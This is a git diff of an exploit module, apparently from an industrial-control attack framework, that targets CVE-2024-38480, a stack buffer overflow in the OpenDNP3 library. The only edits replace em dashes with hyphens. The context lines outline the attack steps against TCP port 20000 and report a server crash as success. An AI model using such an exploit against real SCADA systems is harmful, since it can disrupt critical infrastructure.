@@ -1,4 +1,4 @@
-"""IndustrialXPL CVE Module — CVE-2024-38480 (OpenDNP3 Stack Buffer Overflow).
+"""IndustrialXPL CVE Module - CVE-2024-38480 (OpenDNP3 Stack Buffer Overflow).
 
 Stack buffer overflow in OpenDNP3 library (< 3.1.3) when parsing malformed
 DNP3 Application Layer PDUs. An attacker on the same network segment can
@@ -18,7 +18,7 @@ from industrialxpl.core.exploit import (
 
 class Exploit(Exploit):
     __info__ = {
-        "name":             "CVE-2024-38480 — OpenDNP3 Stack Buffer Overflow",
+        "name":             "CVE-2024-38480 - OpenDNP3 Stack Buffer Overflow",
         "description":      "Stack buffer overflow in OpenDNP3 <3.1.3 via malformed DNP3 Application PDU. Affects SCADA masters and outstations using OpenDNP3. CVSS 9.8.",
         "authors":          ("Andre Henrique (@mrhenrike) | Uniao Geek",),
         "references":       (
@@ -94,7 +94,7 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "CVE-2024-38480 — OpenDNP3 Stack Buffer Overflow\n"
+                    "CVE-2024-38480 - OpenDNP3 Stack Buffer Overflow\n"
                     "CVSS 9.8 | Port 20000/TCP | OpenDNP3 < 3.1.3\n\n"
                     "Step 1: TCP connect to DNP3 port (default 20000)\n"
                     "Step 2: Send malformed DNP3 Application Layer PDU:\n"
@@ -121,12 +121,12 @@ class Exploit(Exploit):
                 resp = s.recv(64)
                 s.close()
                 if not resp:
-                    print_success("[CVE-2024-38480] Empty response — server may have crashed!")
+                    print_success("[CVE-2024-38480] Empty response - server may have crashed!")
                 else:
-                    print_info(f"[CVE-2024-38480] Response received ({len(resp)} bytes) — may be patched")
+                    print_info(f"[CVE-2024-38480] Response received ({len(resp)} bytes) - may be patched")
             except ConnectionResetError:
-                print_success("[CVE-2024-38480] Connection reset — stack overflow triggered!")
+                print_success("[CVE-2024-38480] Connection reset - stack overflow triggered!")
             except TimeoutError:
-                print_success("[CVE-2024-38480] Timeout after payload — crash likely!")
+                print_success("[CVE-2024-38480] Timeout after payload - crash likely!")
         except Exception as e:
             print_error(f"[CVE-2024-38480] {e}")
